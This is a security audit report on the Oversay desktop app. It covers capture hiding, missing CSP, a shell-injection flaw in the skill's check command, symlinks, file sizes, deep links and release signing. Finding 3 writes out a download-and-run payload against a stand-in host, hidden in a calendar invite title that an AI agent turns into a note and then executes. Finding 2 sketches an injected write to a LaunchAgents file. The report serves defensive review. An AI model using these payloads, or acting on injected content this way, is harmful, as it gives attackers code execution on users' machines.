## 1. Capture hiding may not hold on macOS 15+: High if confirmed

- **Where:** `app/src-tauri/src/overlay.rs:460` and `:766` (`content_protected`), `app/src-tauri/src/control_panel.rs:180`; ADR 0003; `docs/platform/fullscreen-results.md:18-28`.
- **What:** Capture hiding uses `NSWindow.sharingType = .none` on macOS and `WDA_EXCLUDEFROMCAPTURE` on Windows. On macOS 15 (Sequoia) and later, captures made with ScreenCaptureKit are widely reported to ignore `sharingType = .none`. Most current meeting and recording apps use ScreenCaptureKit, including Zoom, Teams, Meet in Chrome, OBS and QuickTime. The repo has tested this setting only with screenshots: ADR 0003 says "Zoom or Teams sharing and screen recording are not yet checked".
- **Exploit scenario:** This needs no attacker. A presenter on macOS 15 shares their whole screen in Zoom and trusts the default "Hide overlays from screen sharing and recordings". The audience then sees the talking points, the hints and the "over by 2:00" timing. The control panel is described as "never shared" (ADR 0028), so it would leak in the same way. Finding 6 adds an attacker route: a web page can put a named note on screen.
- **Fix:**
  1. Run the hands-on matrix that is still open in `fullscreen-results.md`: Zoom, Teams, Meet in Chrome, QuickTime recording and OBS, on macOS 15 and 26 and on Windows 11.
  2. If the reports hold, the setting's text must stop promising what macOS no longer gives. On an affected system, say "Hidden from screenshots; share a single window or app, not the whole screen, to keep overlays private", and record the result in ADR 0003.
  3. Look at whether placing the overlays at a window level or on a display that share pickers leave out helps on macOS. Check it hands-on before relying on it.

## 2. No CSP, and the file commands take any path from any window: Medium

- **Where:**
  - `app/src-tauri/tauri.conf.json:25` (`"csp": null`).
  - `app/src-tauri/build.rs:2`: no `AppManifest`, so every `#[tauri::command]` can be called from every window, including the overlays and the control panel.
  - `app/src-tauri/src/project_file.rs:10` `read_project_file` reads any path.
  - `project_file.rs:259` `write_project_file` writes any path with any contents, and any extension.
  - `project_file.rs:17` `paths_exist` reports whether any path is a file.
  - `project_file.rs:115` `trash_project` moves any `*.json` file to the Trash, or its whole folder.
  - `project_file.rs:373` `list_project_versions` lists any folder's `Versions`.
  - `app/src-tauri/src/quick.rs:277` `import_note` copies any `.md` file up to 1 MB into Quick notes.
  - `app/src-tauri/capabilities/default.json`: `clipboard-manager:allow-read-text`.
- **What:** ADR 0007 has Rust move text between disk and the webview without checks, so the webview is the only security boundary. I found no way today for file contents or link contents to run as script:
  - Svelte escapes text.
  - The only `{@html}` (`app/src/manager/Icon.svelte:19`) renders constant icons.
  - Notes are parsed into text spans, never HTML (ADR 0025).
  - The schema restricts every value that goes into a `style=` attribute (`kind`, colours).

  So this is not exploitable today. But there is no second layer of defence. If one HTML-rendering bug ever ships (Markdown links or images, a rich hint, a plugin, a dependency), a hostile note, quick talk or project file can do all of this:
  - read any file the user can (`~/.ssh`, browser profiles, other projects);
  - write any file, for example `~/Library/LaunchAgents/x.plist` or `~/.zshrc`, which is code execution at the next login;
  - read the clipboard;
  - send all of it out with `fetch`, because no CSP limits `connect-src`.
- **Exploit scenario (with a future rendering bug):** A colleague sends "Q3 review.oversay.json", or an AI writes a note from a hostile web page into Quick notes. The note's text renders as HTML and runs `invoke('write_project_file', {path: '/Users/j/Library/LaunchAgents/com.x.plist', contents: …})`. That gives code execution at the next login.
- **Fix:**
  1. Set a CSP in `tauri.conf.json`, for example `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src ipc: http://ipc.localhost`. `ajv` compiles the schema at runtime (`app/src/lib/project/schema.ts:81`), which needs `'unsafe-eval'`. Precompile it with Ajv's standalone code, or allow `'unsafe-eval'` as a first step and remove it later.
  2. Narrow the commands in Rust:
     - `write_project_file` accepts only `*.oversay.json`, and only a path the app has opened, created, or had picked in a dialog this run. Keep that list in Rust, for example in `state.rs`.
     - `read_project_file` accepts `*.json` only.
     - `trash_project` accepts only a path Oversay knows as a project, rather than any `.json`.
  3. Give each window only the commands it needs: an `AppManifest` in `build.rs` and per-window permissions in `capabilities/*.json`. Overlays and the control panel never need the file commands. `scripts/check-commands.py` could check this.

## 3. The skill's `--check` command can run shell code that is in a note's name: Medium

- **Where:** `skills/oversay/SKILL.md:59-60`; the naming rule in `skills/oversay/references/note-format.md:44-50` and `app/src-tauri/src/project_file.rs:212` (`folder_name`).
- **What:** The skill tells the agent to run `"<oversay>" --check "<file>"` on macOS. That is double quotes in a POSIX shell, where `$( )`, backticks and `$VAR` still expand. The file name comes from the meeting's name. The naming rule removes `/ \ : * ? " < > |` and control characters, but keeps `$` and `` ` ``. The PowerShell form (`:60`) has the same problem: `$( )` expands inside double quotes there too.
- **Exploit scenario:** Someone outside the company sends a calendar invite titled ``Q3 sync `curl -s https://evil.example/x|sh` ``. The person asks their agent to "make an Oversay note for my 2pm". The agent reads the calendar, names the note after the invite, writes `Q3 sync `curl…|sh`.md`, then runs the check as the skill says. The shell runs the command. An agent that asks before each shell command would show it, but a person who has allowed the Oversay binary's commands, or who doesn't read closely, would run it.
- **Fix:**
  1. In `SKILL.md`, use single quotes, `'<oversay>' --check '<file>'`, tell the agent to write each `'` as `'\''`, and use single quotes in PowerShell too.
  2. Add `$` and `` ` `` to the characters a note name loses. Change this in `folder_name`, `note-format.md` and `files.ts` together, with the same test cases on both sides (CODING_STANDARDS: shared rules have one source of truth).

## 4. Symlinks in the Quick folders are followed when files are read: Low

- **Where:** `app/src-tauri/src/quick.rs:93` (`is_file()` follows links), `quick.rs:144-161` (`checked` resolves the parent folder but not the file), `quick.rs:210`.
- **What:** `Quick notes/x.md` can be a symlink to any file. It is then listed, read and shown as a note. Saving is safe: `write_atomically` renames over the link and does not write through it.
- **Exploit scenario:** This needs someone else to be able to write into `Documents/Oversay`. Examples are a shared OneDrive or Dropbox folder that holds Documents, or another local account. They plant `Standup.md -> ~/.aws/credentials`, and the person opens or shows "Standup". The file's contents appear in the manager, or on screen during a call (see finding 1).
- **Fix:** In `list_in` and `checked`, use `symlink_metadata` and refuse symlinks, or resolve the file and require it to still be in the folder. Add a test for each.

## 5. Quick files and project files are read with no size limit: Low

- **Where:** `app/src-tauri/src/quick.rs:210`, `app/src-tauri/src/project_file.rs:12`, `check.rs` (`--check`); compare `quick.rs:250` (a 1 MB limit for dropped files only).
- **What:** The skill's rules treat denial of service as out of scope, but John asked about large files. A multi-GB file in Quick notes is read in full, in Rust and then in the webview. The watcher (ADR 0034) refreshes the list on every change. Nothing here is code execution. The Markdown parser is our own and simple, and `note_lint.rs` uses the `regex` crate, which runs in linear time, so I don't see a slow-parser problem.
- **Exploit scenario:** A buggy or hostile agent writes a 4 GB "note". Oversay hangs or is killed by the OS when the note is opened or shown.
- **Fix:** Apply the 1 MB `DROP_LIMIT` (or a few MB for talks) in `read_quick_file`, `read_project_file` and `--check`, with a clear message.

## 6. Any web page can open `oversay://` links, and once allowed, can show a note: Low

- **Where:** `app/src-tauri/src/links.rs:27-39`, `app/src/manager/links.ts:28-38` and `:56-72`, `app/src/lib/notes/show.ts:73`.
- **What:** The design is sound:
  - links name a file and never give a path;
  - `..`, slashes and control characters are refused;
  - names are matched against the folder listing;
  - a link never writes, deletes or starts a clock.

  What is left:
  - Any page can bring the manager to the front and move it between pages. This is refused during a session.
  - If the person once chose "allow" (remember), any web page can put a note with a guessable name on screen without asking, for example `oversay://notes/Standup/show`.
  - `showBlockedBy` refuses only while a session or another note is on screen, not while the person is sharing their screen without a session.
- **Exploit scenario:** The person allowed links so their agent can show notes. Later, a page they visit opens `oversay://notes/1-1%20with%20Priya/show`. A private 1:1 note then appears over their screen, and with finding 1, possibly in the share.
- **Fix:** Keep "allow" for showing, but word the setting as "Any app or web page can show a note". Or limit "allow" to notes changed in the last few minutes, which is when an agent has just written one. Consider a per-minute limit on links that bring the manager forward.

## 7. Release builds: unsigned installers, Actions pinned by tag: Low until Oversay goes public

- **Where:** `.github/workflows/build.yml:62` (`Swatinem/rust-cache@v2`) and the `actions/*@v7/v8` lines; `build.yml` "Replace the latest pre-release", whose notes say to choose "Run anyway" or "Open Anyway".
- **What:** The updater design holds up:
  - the feed must be `https://` and comes with a public key;
  - the updater is registered only when both are set;
  - `requireSignedVersion` is on, a real option in `tauri-plugin-updater` 2.14.0;
  - the signing key is in the build step's environment only;
  - no Actions secrets or variables are set yet;
  - the repo is private;
  - fork PRs never get secrets or installer jobs.

  Two things are left for before going public:
  - The OS installers have no Apple Developer ID signature or notarisation, and no Authenticode signature. The release notes teach people to get past Gatekeeper and SmartScreen.
  - Third-party Actions run in the jobs that will hold `TAURI_SIGNING_PRIVATE_KEY`, and they are pinned by moveable tags. A compromised `rust-cache` can't read a later step's environment, but it can change the toolchain or `target/`, and so the binary that gets signed.
- **Exploit scenario:** After launch, a hijacked third-party Action tag puts a backdoor into a build. The build is then signed with the real updater key, and every installed copy accepts it.
- **Fix:** Before secrets are added, pin every `uses:` to a full commit SHA, and add Developer ID signing, notarisation and Authenticode (ADR 0030 follow-up). Keep the signing key in a GitHub environment that needs approval.

## Checked and found sound

- **`oversay://` parser** (`app/src/lib/links.ts:25-47`): only our scheme gets through (`links.rs:22`); names are decoded and then refused if they hold path characters; only open, show and ready are possible.
- **Quick folder commands** (`quick.rs:144`): `kind` is an enum; the parent folder is resolved and must be the Quick folder; dot files are refused. `create_in` uses create-new, so it never overwrites.
- **Config files** (`project_file.rs:22`): plain names only.
- **Skill install** (`skill.rs`): the frontend names an enum target, never a path. Only the bundled copy is installed. `oversay-local.json` is left out of saved zips. Updates on start replace only copies that have Oversay's `oversay-local.json`, and the old copy goes to the Trash.
- **Overlays** (`overlay.rs:110`, `:445`): plugin ids are validated, and windows load only the bundled `index.html`. No remote origin gets IPC.
- **External links** (ADR 0023): the opener allows only `https://crates.io/*` and `https://www.npmjs.com/*`.
- **Project files**: they are checked against the ajv schema before use, and every value that reaches a `style=` attribute is an enum or a number.
- **Logging**: the log plugin is registered in debug builds only. Link contents aren't logged (`links.rs:31`). Paths are logged, which CODING_STANDARDS allows.
- **Dependencies**:
  - `npm audit`: 0 vulnerabilities.
  - `cargo audit` and `cargo deny` are not installed, so they were not run (see the proposed tasks).
  - `tauri-nspanel` is pinned to a commit.
  - `rust-ini` is pinned to an exact version for a documented reason.
  - The third-party notices are generated by `scripts/third-party.mjs`. I didn't review them for licence accuracy, which is out of scope here.

## Side note: not a security issue

The AI page's "Get Claude", "Get ChatGPT" and "Get Gemini" buttons call `openUrl` with `claude.ai`, `chatgpt.com` and `gemini.google` addresses (`app/src/manager/AiPage.svelte:96-98`, `:208`). The opener only allows `crates.io` and `npmjs.com` (`capabilities/default.json:18-22`), so these buttons probably fail with a scope error. I haven't checked this in the app. If it is confirmed, add those three exact URLs to the allowlist (ADR 0023).
